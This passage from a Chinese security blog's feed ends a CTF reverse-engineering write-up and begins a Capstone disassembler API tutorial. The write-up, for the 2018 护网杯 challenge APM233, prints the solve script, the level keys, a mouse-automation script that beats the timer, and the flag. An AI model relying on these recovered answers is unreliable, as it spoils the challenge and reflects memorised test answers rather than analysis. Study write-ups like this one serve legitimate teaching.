2, 1, 1, 4, 1, 1, 1, 4, 1, 4, 2, 3, 1, 4, 1, 4, 2, 1, 1, 4, 1, 3, 2, 3, 2, 3, 1, 4, 1, 4, 1, 4, 2, 3, 1, 4, 2, 2, 1, 4, 3, 2, 1, 4, 1, 1, 1, 4, 1, 2, 2, 3, 1, 4, 2, 3, 2, 3, 2, 3, 2, 3]</code><br>玩家的行动由输入b64encode后再将编码后的结果拆为两两一组</p><p>脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level4</span><span class="params">()</span>:</span></span><br><span class="line">    a1 = [<span class="number">4</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">-2</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">    a2 = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">-2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">    a3 = [<span class="number">3</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    pos1 = <span class="number">0</span></span><br><span class="line">    pos2 = <span class="number">0</span></span><br><span class="line">    pos3 = <span class="number">0</span></span><br><span class="line">    pos4 = <span class="number">0</span></span><br><span class="line">    choice = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a1)):</span><br><span class="line">        pos1 += a1[i]</span><br><span class="line">        pos2 += a2[i]</span><br><span class="line">        pos3 += a3[i]</span><br><span class="line">        <span class="keyword">if</span> (pos4 + <span class="number">4</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">4</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">4</span> != pos3):</span><br><span class="line">            t = <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> (pos4 + <span class="number">3</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">3</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">3</span> != pos3):</span><br><span class="line">            t = <span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> (pos4 + <span class="number">2</span> != pos1) <span class="keyword">and</span> (pos4 + <span class="number">2</span> != pos2) <span class="keyword">and</span> (pos4 + <span class="number">2</span> != pos3):</span><br><span class="line">            t = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = <span class="number">1</span></span><br><span class="line">        pos4 += t</span><br><span class="line">        choice.append(t<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> choice</span><br><span class="line"></span><br><span class="line">    b64 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> choice</span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(choice),<span class="number">3</span>):</span><br><span class="line">        t = (choice[i]&lt;&lt;<span class="number">4</span>) + (choice[i+<span class="number">1</span>]&lt;&lt;<span class="number">2</span>) + choice[i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">print</span> t,</span><br><span class="line">        ans+=b64[t]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> ans</span><br><span class="line">    <span class="keyword">print</span> b64decode(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># level1 1d2e3c4a</span></span><br><span class="line">level2()    <span class="comment"># efbe3323adde6666feca1313beba1414</span></span><br><span class="line"><span class="comment"># level3 0acb7935481efc12</span></span><br><span class="line">level4()    <span class="comment"># 21d03c42f365901cff</span></span><br></pre></td></tr></table></figure></p><p>程序输入有时间限制，可以找到时间call直接jmp，也可以鼠标模拟</p><p>鼠标点击模拟脚本<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymouse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">m = PyMouse()</span><br><span class="line"></span><br><span class="line">k1 = <span class="string">"1d2e3c4a"</span></span><br><span class="line">key1 = list(k1)</span><br><span class="line">k2 = <span class="string">"efbe3323adde6666feca1313beba1414"</span></span><br><span class="line">key2 = list(k2)</span><br><span class="line">k3 = <span class="string">"0acb7935481efc12"</span></span><br><span class="line">key3 = list(k3)</span><br><span class="line">k4 = <span class="string">"21d03c42f365901cff"</span></span><br><span class="line">key4 = list(k4)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mnclick</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(x[i] == <span class="string">'0'</span>): m.click(<span class="number">1075</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'1'</span>): m.click(<span class="number">1118</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'2'</span>): m.click(<span class="number">1162</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'3'</span>): m.click(<span class="number">1205</span>, <span class="number">418</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'4'</span>): m.click(<span class="number">1075</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'5'</span>): m.click(<span class="number">1118</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'6'</span>): m.click(<span class="number">1162</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'7'</span>): m.click(<span class="number">1205</span>, <span class="number">465</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'8'</span>): m.click(<span class="number">1075</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'9'</span>): m.click(<span class="number">1118</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'a'</span>): m.click(<span class="number">1162</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'b'</span>): m.click(<span class="number">1205</span>, <span class="number">511</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'c'</span>): m.click(<span class="number">1075</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'d'</span>): m.click(<span class="number">1118</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'e'</span>): m.click(<span class="number">1162</span>, <span class="number">558</span>)</span><br><span class="line">        <span class="keyword">elif</span>(x[i] == <span class="string">'f'</span>): m.click(<span class="number">1205</span>, <span class="number">558</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    m.click(<span class="number">670</span>, <span class="number">624</span>)</span><br><span class="line"></span><br><span class="line">mnclick(key1, <span class="number">8</span>)</span><br><span class="line">mnclick(key2, <span class="number">32</span>)</span><br><span class="line">mnclick(key3, <span class="number">16</span>)</span><br><span class="line">mnclick(key4, <span class="number">18</span>)</span><br></pre></td></tr></table></figure></p><p>按钮位置是用spy++查看窗口属性看到的</p><p>最后   flag{N0t_d1ff1cul7_r1ght?_3d34e}</p><p>From <a href="https://kabeor.github.io/2018护网杯线上 APM233/">https://kabeor.github.io/2018护网杯线上 APM233/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018护网杯线上-APM233&quot;&gt;&lt;a href=&quot;#2018护网杯线上-APM233&quot; class=&quot;headerlink&quot; title=&quot;2018护网杯线上 APM233&quot;&gt;&lt;/a&gt;2018护网杯线上 APM233&lt;/h1&gt;&lt;p&gt;MFC42的逆向&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(四)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(四)/</id>
    <published>2019-07-27T02:19:05.676Z</published>
    <updated>2019-08-14T04:49:51.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-四"><a href="#Capstone反汇编引擎数据类型及API分析及示例-四" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(四)"></a>Capstone反汇编引擎数据类型及API分析及示例(四)</h1><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-free"><a href="#cs-free" class="headerlink" title="cs_free"></a>cs_free</h3><p><code>void CAPSTONE_API cs_free(cs_insn *insn, size_t count);</code></p><p>释放被cs_malloc() 或 cs_disasm()分配的内存(insn参数)<br>参数<br>insn: 由cs_disasm()或cs_malloc()中的@insn参数返回的指针<br>count: 赋值由cs_disasm()返回的cs_insn结构的数量，或赋值为1表示由cs_malloc()分配给空闲内存的数量</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3bf583b748d86745.jpg" alt><br>直接调用cs_mem_free,也就是默认的free</p><p>示例(释放cs_disasm申请的内存)，代码片段：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);           <span class="comment">//计数由cs_disasm申请的内存</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);   <span class="comment">//循环依次释放每条insn的内存</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cs-malloc"><a href="#cs-malloc" class="headerlink" title="cs_malloc"></a>cs_malloc</h3><p><code>cs_insn * CAPSTONE_API cs_malloc(csh handle);</code></p><p>被用于在API cs_disasm_iter()中为一条指令分配内存</p><p>参数<br>handle: cs_open()返回的句柄</p><p>代码实现<br><img src="https://i.loli.net/2019/07/27/5d3bf97c0299d21615.jpg" alt></p><p>当这条指令所占的内存不再使用时，使用cs_free(insn, 1)释放，示例在下面cs_disasm_iter处</p><h3 id="cs-disasm-iter"><a href="#cs-disasm-iter" class="headerlink" title="cs_disasm_iter"></a>cs_disasm_iter</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_disasm_iter</span><span class="params">(csh handle,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">uint8_t</span> **code, <span class="keyword">size_t</span> *size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> *address, cs_insn *insn)</span></span>;</span><br></pre></td></tr></table></figure><p>给定buff、大小、地址和要解码的指令数，更快速的反汇编机器码，<br>这个API将生成的指令放入insn中的给定的缓存中。</p><p>注意1: 此API将更新code、size和address以指向输入缓冲区中的下一条指令。所以，虽然每次反汇编一条指令可以使用cs_disasm(count=1)来实现，但一些基准测试显示，在循环中使用cs_disasm_iter()可以方便地快速迭代所有指令，在随机输入时可以快30%。</p><p>注意2:可以使用cs_malloc()创建insn中的缓存。</p><p>注意3:对于动态分配内存可能产生内存不足的系统(比如OS内核或固件)，建议使用cs_disasm()这个API, 因为cs_disasm()是根据要分解的指令的数量来分配内存。</p><p>参数<br>handle: cs_open()返回的句柄<br>code: 要反汇编的机器码所在的缓冲区<br>size: 机器码缓冲区的大小<br>address: 所给机器码缓冲区中第一个insn的地址<br>insn: 指向这个API要填充的指令的指针。<br>return:如果这个API成功反汇编了一条指令返回true，否则将返回false。</p><p>失败时，调用cs_errno()获取错误代码。</p><p>代码实现，在cs_disasm基础上使用动态内存分配</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_disasm_iter</span><span class="params">(csh ud, <span class="keyword">const</span> <span class="keyword">uint8_t</span> **code, <span class="keyword">size_t</span> *size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> *address, cs_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">uint16_t</span> insn_size;</span><br><span class="line">MCInst mci;</span><br><span class="line"><span class="keyword">bool</span> r;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line">MCInst_Init(&amp;mci);</span><br><span class="line">mci.csh = handle;</span><br><span class="line"></span><br><span class="line">mci.address = *address;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为无detail模式保存相关信息</span></span><br><span class="line">mci.flat_insn = insn;</span><br><span class="line">mci.flat_insn-&gt;address = *address;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">mci.flat_insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">mci.flat_insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">r = handle-&gt;disasm(ud, *code, *size, &amp;mci, &amp;insn_size, *address, handle-&gt;getinsn_info);</span><br><span class="line"><span class="keyword">if</span> (r) &#123;</span><br><span class="line">SStream ss;</span><br><span class="line">SStream_Init(&amp;ss);</span><br><span class="line"></span><br><span class="line">mci.flat_insn-&gt;size = insn_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将内部指令操作码映射到公共insn ID</span></span><br><span class="line">handle-&gt;insn_id(handle, insn, mci.Opcode);</span><br><span class="line"></span><br><span class="line">handle-&gt;printer(&amp;mci, &amp;ss, handle-&gt;printer_info);</span><br><span class="line"></span><br><span class="line">fill_insn(handle, insn, ss.buffer, &amp;mci, handle-&gt;post_printer, *code);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整伪操作码(X86)</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_X86)</span><br><span class="line">insn-&gt;id += mci.popcode_adjust;</span><br><span class="line"></span><br><span class="line">*code += insn_size;</span><br><span class="line">*size -= insn_size;</span><br><span class="line">*address += insn_size;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 遇到中断指令</span></span><br><span class="line"><span class="keyword">size_t</span> skipdata_bytes;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有跳过数据的请求，或者剩余数据太小，则退出</span></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;skipdata || handle-&gt;skipdata_size &gt; *size)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_setup.callback) &#123;</span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_setup.callback(*code, *size,</span><br><span class="line"><span class="number">0</span>, handle-&gt;skipdata_setup.user_data);</span><br><span class="line"><span class="keyword">if</span> (skipdata_bytes &gt; *size)</span><br><span class="line"><span class="comment">// 剩余数据太小</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skipdata_bytes)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于架构和模式跳过一些数据</span></span><br><span class="line">insn-&gt;id = <span class="number">0</span>;<span class="comment">// 此“数据”指令的ID无效</span></span><br><span class="line">insn-&gt;address = *address;</span><br><span class="line">insn-&gt;size = (<span class="keyword">uint16_t</span>)skipdata_bytes;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="built_in">memcpy</span>(insn-&gt;bytes, *code, skipdata_bytes);</span><br><span class="line"><span class="built_in">strncpy</span>(insn-&gt;mnemonic, handle-&gt;skipdata_setup.mnemonic,</span><br><span class="line"><span class="keyword">sizeof</span>(insn-&gt;mnemonic) - <span class="number">1</span>);</span><br><span class="line">skipdata_opstr(insn-&gt;op_str, *code, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">*code += skipdata_bytes;</span><br><span class="line">*size -= skipdata_bytes;</span><br><span class="line">*address += skipdata_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE16 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[4] = &#123;</span>     <span class="comment">//架构及模式</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_16,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE16,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 16bit (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32bit (ATT syntax)"</span>,</span><br><span class="line">CS_OPT_SYNTAX,</span><br><span class="line">CS_OPT_SYNTAX_ATT,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为cs_disasm_iter()分配内存</span></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);   <span class="comment">//原机器码</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;   <span class="comment">//cs_disasm_iter反汇编</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s // insn-ID: %u, insn-mnem: 